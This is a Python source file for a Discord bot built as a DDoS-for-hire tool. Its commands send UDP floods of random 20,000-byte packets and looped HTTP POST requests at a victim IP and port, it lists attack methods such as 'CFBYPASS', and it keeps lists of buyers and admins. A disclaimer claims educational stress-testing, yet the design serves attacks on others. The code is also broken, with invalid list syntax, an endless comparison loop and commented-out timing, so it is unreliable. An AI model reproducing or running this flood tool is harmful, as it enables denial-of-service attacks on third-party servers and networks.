# I may not be held responsible for any damage caused by my code. This project is purely made for 'Proof-Of-Concept', educational purposed,
# and stress-testing your own networks and IoT devices to test your DDoS protection. I do not tolerate any illegal use of my code,
# and the user is responsible for everything that he/she/they do with my code.
#
# This was created because a lot of script kiddies have been making poorly coded Discord DDoS bots, they used requests.get/post for Discord Bots, they used unclean code,
# they used poor grammar on the bots, and so on.
#
# With poor grammar, I refer to the people that say 'your' instead of 'you're', 'i' instead of 'I', 'dont' instead of 'don't', and so on.
# These little children should pay attention in school. Such grammar mistakes make you look more silly, and therefore you will archive less.
#
# This was made by XxBiancaXx#4356.
#
# LINKS:
# https://www.github.com/XxB1a/ddos-discord-bot
# https://www.instagram.com/moron420
import requests
import time
import socket
import random
import sys
from discord.ext import commands     # Commands
from discord.ext.commands import Bot # BOt
from os import system                # This will be used to clear the screen in on_ready()
from os import name                  # ^
from colorama import *               # This will be used to print our startup banner in color
import discord                       # D I S C O R D
import aiohttp                       # For our API Requests
import random                        # Random.randint(1,6) will be used in the random_color() function!

buyers  = [, 2, 3]              # Replace digits with Discord USER-IDs!
admins  = [, 2, 3]              # Replace digits with Discord USER-IDs! (admins!!)
owners  = [, 2, 3]              # Replace digits with Discord USER-IDs! (owners, they cannot be removed!!)
token   = ''                  # Discord Bot token
bot     = commands.Bot(command_prefix='.')

l4methods = ['TCP', 'UDP', 'STD']             # Our Layer4 methods. Add more if desired!
l7methods = ['HTTP', 'CFBYPASS', 'HTTP-NUKE'] # Our Layer7 methods. Add more if desired!

# This is a list of dirs. We will use this for multiple API keys in the DDoS command.
api_data = [
    {
        'api_url':'https://www.yahoo.com', # API URL #1
        'api_key':'KEYYYYYY',              # API KEY #1
        'max_time':'1200'                  # The max booting time for our bot. You need to change it, probably.
    },
    {
        'api_url':'https://www.google.com', # API URL #1
        'api_key':'KEYYYYYY',               # API KEY #1
        'max_time':'300'                    # The max booting time for our bot. You need to change it, probably.
    }
]

# This is our function to give embeds a random color!
# You can call it using 'await random_color()'
async def random_color():
    number_lol = random.randint(1, 999999)

    while len(str(number_lol)) != 6:
        number_lol = int(str(f'{random.randint(1, 9)}{number_lol}'))

    return number_lol

@bot.command()

async def sdatareader(ctx, ip : str = None):
  r = requests.get("http://"+ip)
  print(r.text)
  p = requests.post("http://"+ip)
  embed = discord.Embed(title="Server Data Reader", description=f'Get :\n{r.text}\nPost :\n{p.text}', color=await random_color())
  await ctx.send(embed=embed)

@bot.command()
async def ddoshelp(ctx):
  embed = discord.Embed(title="DDOS Help", description=f".ddos <ip> <port> <duration>", color=await random_color())
  await ctx.send(embed=embed)
@bot.command()

async def ddos2(ctx, ip : str = None, count : str = None):
  while (0 < count):
    o = requests.post("http://"+ip)
  #print("Sending Requests")
  embed = discord.Embed(title="DDOS 2", description=f"Sending DDOS 2", color=await random_color())
  await ctx.send(embed=embed)
@bot.command()

async def ddos(ctx, victim : str = None, vport : int = None, duration : int = None):
# Support us yaakk... :)
    # Okey Jadi disini saya membuat server, Ketika saya memanggil "SOCK_DGRAM" itu  menunjukkan  UDP type program
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 20000 representasi satu byte ke server
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 3000
  
  #if time.time() > timeout:
   # break
   # else:
 #       pass
    client.sendto(bytes, (victim, vport))
    sent = sent + 1
    #await ctx.send('Sending ddos to ')
    print("Sending DDOS to ", sent, victim, vport)
    #if victim is None:
   #         await ctx.send('You need a target!')

        # There was no port
   # if vport is None:
   #         await ctx.send('You need a port!')

        # There was no time
   # if duration is None:
     #       await ctx.send('You need a duration!')

    embed = discord.Embed(title="DDOS!", description=f"Starting DDOS to {victim}, Port : {vport}, Duration : {duration}", color=await random_color())
    await ctx.send(embed=embed)

@bot.event
async def on_ready():
    banner = f"""
        {Fore.RED}DDOS BOT
        {Fore.RESET}"""

    if name == 'nt':
        system('cls')

    else:
        system('clear')

    print(banner)
    print(f'{Fore.RED}           Logged in on {Fore.YELLOW}{bot.user.name}{Fore.GREEN}! My ID is {Fore.BLUE}{bot.user.id}{Fore.MAGENTA}, I believe!{Fore.RESET}\n')
    
    if str(len(bot.guilds)) == 1:
        await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"{len(bot.guilds)} server!"))
        
    else:
        await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"{len(bot.guilds)} servers!"))

if __name__ == '__main__':
    init(convert=True)
    bot.run(token)
